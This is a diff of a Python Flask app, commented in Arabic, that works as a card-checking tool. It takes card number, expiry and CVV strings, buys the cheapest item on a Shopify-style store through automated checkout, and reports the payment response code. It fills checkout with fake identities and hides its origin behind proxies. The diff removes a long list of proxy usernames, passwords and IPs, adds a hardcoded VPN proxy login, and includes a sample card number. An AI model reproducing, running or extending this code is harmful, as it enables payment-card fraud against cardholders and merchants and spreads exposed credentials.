@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة والبروكسيات المتغيرة
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
 import time
 import re
 import json
@@ -17,225 +17,36 @@ import threading
 import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
-import random
-from fake_useragent import UserAgent
-from faker import Faker
-
-# تهيئة Faker مع دعم اللغة الإنجليزية للحصول على بيانات متنوعة
-fake = Faker('en_US')
 
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
 MAX_WORKERS = 50
 REQUEST_TIMEOUT = 60
-MAX_RETRIES = 3
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
-logging.basicConfig(level=logging.WARNING)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ==================== قائمة البروكسيات ====================
-PROXY_LIST = [
-    {"user": "207273", "pass": "YXn4KChV", "ip": "192.144.26.139", "port": "8800"},
-    {"user": "207273", "pass": "YXn4KChV", "ip": "177.234.142.34", "port": "8800"},
-    {"user": "207273", "pass": "YXn4KChV", "ip": "192.144.26.7", "port": "8800"},
-    {"user": "207273", "pass": "YXn4KChV", "ip": "192.144.26.182", "port": "8800"},
-    {"user": "207273", "pass": "YXn4KChV", "ip": "177.234.142.110", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "38.154.127.188", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "38.154.127.189", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "192.186.190.226", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "38.154.127.233", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "192.186.190.229", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "192.186.190.236", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "192.186.190.252", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "38.154.127.208", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "38.154.127.214", "port": "8800"},
-    {"user": "207274", "pass": "bv5KcH7JVR", "ip": "192.186.190.225", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.80.4", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.92.196", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.92.245", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.92.197", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.80.43", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.80.2", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.80.1", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.92.244", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.80.54", "port": "8800"},
-    {"user": "207276", "pass": "gFuY3QqABfF", "ip": "107.175.92.242", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "195.242.209.13", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "195.242.209.223", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "167.160.171.193", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "167.160.171.51", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "195.242.209.205", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "167.160.171.139", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "195.242.209.142", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "167.160.171.234", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "195.242.209.18", "port": "8800"},
-    {"user": "207295", "pass": "hwst5RWh4", "ip": "167.160.171.116", "port": "8800"},
-]
-
-# ==================== قائمة الأسماء والألقاب والمدن والشوارع للتبديل ====================
-FIRST_NAMES = ['James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth', 
-               'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica', 'Thomas', 'Sarah', 'Charles', 'Karen',
-               'Anthony', 'Lisa', 'Matthew', 'Nancy', 'Daniel', 'Betty', 'Paul', 'Helen', 'Mark', 'Sandra',
-               'Donald', 'Donna', 'George', 'Carol', 'Kenneth', 'Ruth', 'Steven', 'Sharon', 'Edward', 'Michelle',
-               'Brian', 'Laura', 'Ronald', 'Kimberly', 'Kevin', 'Deborah', 'Jason', 'Emily', 'Jeffrey', 'Amanda']
-
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
-              'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee',
-              'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker',
-              'Young', 'Allen', 'King', 'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores', 'Green',
-              'Adams', 'Nelson', 'Baker', 'Hall', 'Rivera', 'Campbell', 'Mitchell', 'Carter', 'Roberts', 'Turner']
-
-CITIES_STATES = [
-    ('New York', 'NY'), ('Los Angeles', 'CA'), ('Chicago', 'IL'), ('Houston', 'TX'), ('Phoenix', 'AZ'),
-    ('Philadelphia', 'PA'), ('San Antonio', 'TX'), ('San Diego', 'CA'), ('Dallas', 'TX'), ('Austin', 'TX'),
-    ('Jacksonville', 'FL'), ('Fort Worth', 'TX'), ('Columbus', 'OH'), ('Charlotte', 'NC'), ('San Francisco', 'CA'),
-    ('Indianapolis', 'IN'), ('Seattle', 'WA'), ('Denver', 'CO'), ('Washington', 'DC'), ('Boston', 'MA'),
-    ('El Paso', 'TX'), ('Detroit', 'MI'), ('Nashville', 'TN'), ('Portland', 'OR'), ('Oklahoma City', 'OK'),
-    ('Las Vegas', 'NV'), ('Baltimore', 'MD'), ('Louisville', 'KY'), ('Milwaukee', 'WI'), ('Albuquerque', 'NM'),
-    ('Tucson', 'AZ'), ('Miami', 'FL'), ('Raleigh', 'NC'), ('Omaha', 'NE'), ('Cleveland', 'OH'),
-    ('Tulsa', 'OK'), ('Oakland', 'CA'), ('Minneapolis', 'MN'), ('Wichita', 'KS'), ('Arlington', 'TX'),
-    ('Bakersfield', 'CA'), ('New Orleans', 'LA'), ('Honolulu', 'HI'), ('Anaheim', 'CA'), ('Tampa', 'FL'),
-    ('Aurora', 'CO'), ('Santa Ana', 'CA'), ('St. Louis', 'MO'), ('Riverside', 'CA'), ('Corpus Christi', 'TX')
-]
-
-STREET_NAMES = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Washington Ave', 'Park Ave', 'Lake Dr',
-                'Hill St', 'Pine St', 'Church St', 'Market St', 'Bridge St', 'River St', 'Forest Ave',
-                'Valley Rd', 'Mountain Ave', 'Sunset Blvd', 'Highland Ave', 'Grove St', 'Willow Dr', 'Magnolia Blvd',
-                'Hollywood Blvd', 'Broadway', 'Michigan Ave', 'Pennsylvania Ave', 'Independence Ave', 'Constitution Ave']
-
-EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com', 'mail.com', 'aol.com',
-                 'icloud.com', 'yandex.com', 'zoho.com', 'fastmail.com', 'tutanota.com']
-
-def generate_fake_shipping_data():
-    """توليد بيانات شحن وهمية متغيرة لكل محاولة"""
-    first_name = random.choice(FIRST_NAMES)
-    last_name = random.choice(LAST_NAMES)
-    full_name = f"{first_name} {last_name}"
-    
-    city, state = random.choice(CITIES_STATES)
-    
-    street_num = random.randint(100, 9999)
-    street = random.choice(STREET_NAMES)
-    address1 = f"{street_num} {street}"
-    
-    # توليد رمز بريدي عشوائي
-    zip_codes = ['10001', '10002', '10003', '10004', '10005', '10006', '10007', '10008', '10009', '10010',
-                 '90001', '90002', '90003', '90004', '90005', '90006', '90007', '90008', '90009', '90010',
-                 '60601', '60602', '60603', '60604', '60605', '60606', '60607', '60608', '60609', '60610',
-                 '77001', '77002', '77003', '77004', '77005', '77006', '77007', '77008', '77009', '77010',
-                 '85001', '85002', '85003', '85004', '85005', '85006', '85007', '85008', '85009', '85010']
-    zip_code = random.choice(zip_codes)
-    
-    # توليد رقم هاتف عشوائي بصيغة أمريكية
-    area_code = random.randint(200, 999)
-    prefix = random.randint(200, 999)
-    line = random.randint(1000, 9999)
-    phone = f"{area_code}{prefix}{line}"
-    
-    # توليد بريد إلكتروني عشوائي
-    email_domain = random.choice(EMAIL_DOMAINS)
-    email_username = f"{first_name.lower()}{last_name.lower()}{random.randint(1, 999)}"
-    email = f"{email_username}@{email_domain}"
-    
-    return {
-        "email": email,
-        "first_name": first_name,
-        "last_name": last_name,
-        "full_name": full_name,
-        "address1": address1,
-        "city": city,
-        "state": state,
-        "zip": zip_code,
-        "phone": phone
-    }
-
-def get_random_proxy():
-    return random.choice(PROXY_LIST)
-
-def get_random_user_agent():
-    ua = UserAgent()
-    return ua.random
-
-def get_proxy_url(proxy):
-    return f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
-
-def extract_code_with_underscore_priority(all_codes, all_typenames, excluded_codes):
-    """
-    طريقة استخراج رد جديدة - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
-    إذا لم يتم العثور على أي code يحتوي على _ ، ينتقل إلى __typename
-    """
-    
-    # تصفية الكودات المستبعدة أولاً
-    valid_codes = []
-    for code in all_codes:
-        is_excluded = False
-        for excluded in excluded_codes:
-            if excluded in code:
-                is_excluded = True
-                break
-        if not is_excluded:
-            valid_codes.append(code)
-    
-    # المرحلة 1: البحث عن codes تحتوي على شرطة سفلية _
-    underscore_codes = [code for code in valid_codes if '_' in code]
-    
-    # استبعاد بعض patterns المعروفة غير المرغوب فيها حتى لو كانت تحتوي على _
-    unwanted_patterns = [
-        'Free_Postal_Shipping', 'UPS_', 'Economy_', 'First_', 'Standard_', 'Priority_', 
-        'GroundAdvantage_', 'MediaMail_', 'Flat_', 'Shipping_', 'Express_', 
-        'PrivacyBannerSettingsBulletPoints_', 'UiExtension_', 'fedex_ground_economy_',
-        'CAMP_', 'by-items_'
-    ]
-    
-    filtered_underscore_codes = []
-    for code in underscore_codes:
-        is_unwanted = False
-        for pattern in unwanted_patterns:
-            if pattern in code:
-                is_unwanted = True
-                break
-        if not is_unwanted:
-            filtered_underscore_codes.append(code)
-    
-    # إذا وجدنا codes تحتوي على _ بعد التصفية، نعيد أول واحد
-    if filtered_underscore_codes:
-        return filtered_underscore_codes[0], None
-    
-    # المرحلة 2: إذا لم نجد codes تحتوي على _ ، نبحث في __typename عن ما يحتوي على _
-    if all_typenames:
-        typename_underscore = [t for t in all_typenames if '_' in t]
-        # تصفية الأنماط غير المرغوب فيها من typenames أيضاً
-        filtered_typename_underscore = []
-        for t in typename_underscore:
-            is_unwanted = False
-            for pattern in unwanted_patterns:
-                if pattern in t:
-                    is_unwanted = True
-                    break
-            if not is_unwanted:
-                filtered_typename_underscore.append(t)
-        
-        if filtered_typename_underscore:
-            return filtered_typename_underscore[0], filtered_typename_underscore[0]
-    
-    # المرحلة 3: إذا لم نجد أي شيء يحتوي على _ في codes ولا typenames
-    # نرجع أول code عادي صالح
-    if valid_codes:
-        return valid_codes[0], None
-    
-    # المرحلة 4: كملاذ أخير، نرجع أول typename
-    if all_typenames:
-        return all_typenames[0], all_typenames[0]
-    
-    return None, None
-
 def ff(ccx, site):
+    """
+    ccx: رقم البطاقة|الشهر|السنة|cvv
+    مثال: '4918460118934875|08|2027|293'
+    site: رابط الموقع
+    مثال: 'https://www.militadowatch.com/'
+    """
     
-    # ==================== توليد بيانات شحن وهمية متغيرة ====================
-    shipping_data = generate_fake_shipping_data()
+    shipping_data = {
+        "email": "jbyytt@hi2.in",
+        "first_name": "wrence",
+        "last_name": "Bartt",
+        "address1": "c1 york",
+        "city": "New York",
+        "state": "New York",
+        "zip": "10009",
+        "phone": "2012583991"
+    }
     
     parts = ccx.split('|')
     if len(parts) != 4:
@@ -245,7 +56,7 @@ def ff(ccx, site):
         "number": parts[0].strip(),
         "expiry": f"{parts[1].strip()}/{parts[2].strip()[-2:]}",
         "cvv": parts[3].strip(),
-        "name": shipping_data["full_name"]  # استخدام الاسم الوهمي للبطاقة
+        "name": "Lawrence Barnett"
     }
     
     found_code = None
@@ -262,14 +73,13 @@ def ff(ccx, site):
     
     # ==================== 1. جلب رابط الدفع ====================
     try:
-        proxy = get_random_proxy()
-        proxy_url = get_proxy_url(proxy)
+        proxy = "px440401.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
+        ip, port, user, pwd = proxy.split(":")
+        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
         proxies = {"http": proxy_url, "https": proxy_url}
         
-        user_agent = get_random_user_agent()
-        
         s = requests.Session()
-        s.headers.update({'User-Agent': user_agent})
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -277,21 +87,8 @@ def ff(ccx, site):
             'service', 'guarantee', 'support'
         ]
         
-        r = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
-                if r.status_code == 200:
-                    break
-            except:
-                pass
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(1)
-                proxy = get_random_proxy()
-                proxy_url = get_proxy_url(proxy)
-                proxies = {"http": proxy_url, "https": proxy_url}
-        
-        if r is None or r.status_code != 200:
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        if r.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to fetch products"}
         
         products_data = r.json()
@@ -329,40 +126,11 @@ def ff(ccx, site):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
-                if resp.status_code == 200:
-                    break
-            except:
-                pass
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(1)
-                proxy = get_random_proxy()
-                proxy_url = get_proxy_url(proxy)
-                proxies = {"http": proxy_url, "https": proxy_url}
-        
-        if resp is None or resp.status_code != 200:
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart"}
         
-        response = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
-                if response.status_code == 200:
-                    break
-            except:
-                pass
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(1)
-                proxy = get_random_proxy()
-                proxy_url = get_proxy_url(proxy)
-                proxies = {"http": proxy_url, "https": proxy_url}
-        
-        if response is None or response.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to get checkout"}
-        
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
         checkout_url = response.url
         
     except Exception as e:
@@ -393,7 +161,7 @@ def ff(ccx, site):
         driver.get(checkout_url)
         time.sleep(2)
         
-        # ==================== 3. تعبئة الشحن ببيانات وهمية ====================
+        # ==================== 3. تعبئة الشحن ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
             email_field.clear()
@@ -659,24 +427,17 @@ def ff(ccx, site):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-                'Economy',
-                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'First', 
-                'by-items', 
-                'Standard', 
-                'Priority', 
-                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'GroundAdvantage', 
-                'MediaMail', 
-                'CAMP', 
-            'Flat', 
-                'Shipping', 
-                'fedex_ground_economy', 
-                'PrivacyBannerSettingsBulletPoints', 
-                'Express', 
-                'UiExtension', 
-                'NegotiationResultPayload'
-                
+             'Economy',
+             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'First', 
+            'by-items', 
+            'Standard', 
+            'Priority', 
+            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'GroundAdvantage', 
+            'MediaMail'
+           
+             
             ]
             
             for attempt in range(10):
@@ -948,7 +709,6 @@ def ff(ccx, site):
             if driver:
                 driver.quit()
             
-            # ==================== استخدام طريقة الاستخراج الجديدة ====================
             if order_confirmed:
                 result_code = 'ORDER_CONFIRMED'
                 result_typename = 'OrderConfirmed'
@@ -965,21 +725,27 @@ def ff(ccx, site):
             elif found_code and found_code not in excluded_codes:
                 result_code = found_code
                 result_typename = found_typename
-            else:
-                # استخدام دالة الاستخراج الجديدة التي تعطي أولوية للـ codes التي تحتوي على _
-                extracted_code, extracted_typename = extract_code_with_underscore_priority(
-                    all_codes, all_typenames, excluded_codes
-                )
-                
-                if extracted_code:
-                    result_code = extracted_code
-                    result_typename = extracted_typename if extracted_typename else found_typename
-                elif all_typenames:
-                    result_code = all_typenames[0]
-                    result_typename = all_typenames[0]
+            elif all_codes:
+                valid_codes = []
+                for code in all_codes:
+                    is_excluded = False
+                    for excluded in excluded_codes:
+                        if excluded in code:
+                            is_excluded = True
+                            break
+                    if not is_excluded:
+                        valid_codes.append(code)
+                if valid_codes:
+                    result_code = valid_codes[0]
                 else:
-                    result_code = None
-                    result_typename = None
+                    result_code = all_codes[0]
+                result_typename = found_typename or (all_typenames[0] if all_typenames else None)
+            elif all_typenames:
+                result_code = all_typenames[0]
+                result_typename = all_typenames[0]
+            else:
+                result_code = None
+                result_typename = None
             
             if result_code:
                 return {
